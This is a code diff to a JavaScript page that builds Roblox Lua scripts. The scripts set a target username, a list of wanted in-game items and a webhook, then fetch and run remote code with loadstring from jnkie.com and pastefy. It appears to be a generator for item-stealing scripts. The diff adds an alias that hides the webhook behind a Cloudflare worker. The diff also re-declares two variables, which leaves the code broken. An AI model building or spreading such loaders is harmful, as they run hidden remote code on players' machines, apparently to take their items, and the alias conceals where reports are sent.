@@ -762,6 +762,22 @@ const ANIMALS = [
   { name: "Jackorilla", rarity: "Secret", mps: "315K/s" },
   { name: "Secret Lucky Block", rarity: "Secret", mps: "0/s" }
 ];
+ const KV_WORKER_URL = 'https://young-bonus-cf67.dongdihng.workers.dev';
+
+function generateAlias(length = 8) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let result = '';
+  const randomValues = new Uint8Array(length);
+  crypto.getRandomValues(randomValues);
+  for (let i = 0; i < length; i++) {
+    result += chars.charAt(randomValues[i] % chars.length);
+  }
+  return result;
+}
+
+let selected = new Set();
+let adminMode = 'no-gui';
+let customAdminLoadstring = '';
 
 let selected = new Set();
 let adminMode = 'no-gui';
@@ -999,7 +1015,7 @@ function validateWebhook() {
   }
 }
 
-function generate() {
+async function generate() {
   const username = document.getElementById('usernameInput').value.trim();
   const webhook = document.getElementById('webhookInput').value.trim();
   const out = document.getElementById('outputBlock');
@@ -1020,31 +1036,40 @@ function generate() {
     return;
   }
 
-  const names = [...selected];
-  const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+  const alias = generateAlias();
 
-  let adminScriptPart = '';
-  if (adminMode === 'admin-panel') {
-    adminScriptPart = `
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
-end)
-`;
-  } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-    adminScriptPart = `
-${customAdminLoadstring}
-`;
+  try {
+    const response = await fetch(`${KV_WORKER_URL}/store`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ alias, url: webhook })
+    });
+    if (!response.ok) throw new Error('KV store failed');
+  } catch (error) {
+    console.error(error);
+    out.className = 'code-block empty';
+    out.textContent = '-- Erreur lors de la sauvegarde dans Cloudflare KV.';
+    return;
   }
 
-  const script = `getgenv().WEBHOOK_URL = "${webhook}";
+  const names = [...selected];
+  const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+  let adminScriptPart = '';
+  if (adminMode === 'admin-panel') {
+    adminScriptPart = `task.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)`;
+  } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
+    adminScriptPart = customAdminLoadstring;
+  }
+
+  const script = `getgenv().WEBHOOK_URL = "${alias}";
+if #getgenv().WEBHOOK_URL < 20 then
+  getgenv().WEBHOOK_URL = game:HttpGet("${KV_WORKER_URL}/resolve/" .. getgenv().WEBHOOK_URL)
+end
 getgenv().TARGET_USERNAME = "${username}";
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
 };
-
-
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))();
-
 ${adminScriptPart}
 `;
 
